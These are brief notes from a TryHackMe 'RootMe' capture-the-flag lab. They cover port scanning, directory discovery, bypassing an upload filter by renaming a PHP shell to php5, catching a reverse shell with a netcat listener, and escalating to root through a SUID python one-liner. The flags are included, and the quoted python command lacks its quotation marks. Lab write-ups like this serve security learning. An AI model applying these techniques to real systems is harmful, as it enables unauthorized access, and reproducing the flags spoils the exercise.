# Beginners RootMe CTF on TryHackMe

IP=`10.10.89.238`

Ports:
```
22 ssh
80 http
```

gobuster
```
/uploads/
/panel/
```

Failed to upload a regular php file but converting it to php5 did the trick

Used a netcat listener on port 9999

user flag was in /var/www
`THM{y0u_g0t_a_sh3ll}`
Scanning for suid files and we notice python has root priviledges
launched a priviledged shell through python
`python -c import os; os.execl("/bin/sh", "sh", "-p")`

root flag:
`THM{pr1v1l3g3_3sc4l4t10n}`
